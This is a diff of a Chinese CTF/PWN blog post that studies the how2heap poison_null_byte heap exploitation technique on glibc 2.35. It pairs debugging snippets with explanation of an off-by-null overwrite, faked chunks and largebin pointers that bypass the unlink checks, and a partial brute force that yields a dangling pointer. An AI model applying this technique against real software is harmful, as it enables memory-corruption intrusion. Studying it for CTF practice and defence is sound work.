@@ -1,14 +1,17 @@
 ---
-layout: post
+layout: single
 title: "poison_null_byte"
 date: 2026-10-07 20:05:00 +0800
 tags: ["CTF", "PWN"]
 description: "记录 glibc 2.35 中 poison_null_byte 的源码分析与调试过程。"
 source_folder: "PWN/Heap Exploitation/how2heap Debugging/2.35/poison_null_byte"
 lang: zh-CN
+excerpt: "记录 glibc 2.35 中 poison_null_byte 的源码分析与调试过程。"
 ---
 {% raw %}
+
 # 源码
+
 ```
 #include <stdio.h>
 #include <stdlib.h>
@@ -172,8 +175,11 @@ int main()
 	assert(strstr(merged, "CCCCCCCCC"));
 }
 ```
+
 该样例通过off by null修改标志位，同时伪造chunk和largebin链表绕过保护，获取一个悬垂指针，是很多攻击的起始。
+
 # 调试过程
+
 ```
 void *tmp = malloc(0x1);
 void *padding= malloc(0x3d41);  //使下一个chunk的起始地址低2bytes为\x00
@@ -187,40 +193,54 @@ malloc(0x10);
 void *b = malloc(0x510);
 malloc(0x10);
 ```
+
 ![屏幕截图 2026-02-13 142239](/assets/ctf/8c625c6584e17a6048fe.webp)
+
 ```
     free(a);
     free(b);
     free(prev);
 ```
+
 ![屏幕截图 2026-02-13 142415](/assets/ctf/63560f3b217498e844ad.webp)
 ![屏幕截图 2026-02-13 142427](/assets/ctf/3546f9fa7861079ededa.webp)
+
 ```
 malloc(0x1000);  //触发consolidation
 ```
+
 ![屏幕截图 2026-02-13 142557](/assets/ctf/671fb6f4fc62943bf556.webp)
+
 ```
 void *prev2 = malloc(0x500);
 ```
+
 ![屏幕截图 2026-02-13 143656](/assets/ctf/0e49079cf72a50a8d58d.webp)
+
 ```
 ((long *)prev)[1] = 0x501;
 *(long *)(prev + 0x500) = 0x500;
 ```
+
 ![屏幕截图 2026-02-13 143735](/assets/ctf/c29eca91ad384d87d92b.webp)
 ![屏幕截图 2026-02-13 145508](/assets/ctf/e8203861d346a6a895d7.webp)
+
 ```
     void *b2 = malloc(0x510);
     ((char*)b2)[0] = '\x10';
     ((char*)b2)[1] = '\x00';
 ```
+
 ![屏幕截图 2026-02-13 161434](/assets/ctf/39d8c5f9a3377aa9bb3f.webp)
+
 ```
     void *a2 = malloc(0x4f0);
     free(a2);
     free(victim);
 ```
+
 ![屏幕截图 2026-02-13 161704](/assets/ctf/34729980741f3e8c05ee.webp)
+
 ```
     void *a3 = malloc(0x4f0);
     ((char*)a3)[8] = '\x10';
@@ -231,6 +251,7 @@ void *prev2 = malloc(0x500);
     //      if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
     //          malloc_printerr ("corrupted double-linked list");
 ```
+
 这里如果能泄露堆地址，可以直接算偏移覆写；如果不能，则需要如上操作通过glibc获取bk和fd指针的高位，暴力爆破堆基地址的第二低byte位（1/16爆破）。
 	*覆盖a时由于只校验bk指针位置，fd指针位置可直接填padding。*
 
@@ -241,8 +262,10 @@ void *victim2 = malloc(0x4f0);
 
 free(victim);   //触发consolidation()
 ```
+
 到这里，就可以直接malloc切unsortedbin，获得悬垂指针了。
 ![屏幕截图 2026-02-13 161704](/assets/ctf/34729980741f3e8c05ee.webp)
+
 ```
 void *merged = malloc(0x100);
 assert(prev2 == merged));
@@ -250,6 +273,7 @@ assert(prev2 == merged));
 
 # 攻击逻辑
 通过off by null覆盖inuse位，free触发consolidation，同时利用nextsize按chunk size大小排序的规则伪造链表，和链表指向chunk（可同时利用fd，bk指针获取高位堆地址）绕过对fd、bk链表指针的一致性检测，获得悬垂指针。
+
 # 攻击流程
 1. 有off by null。
 2. malloc并伪造如下chunk
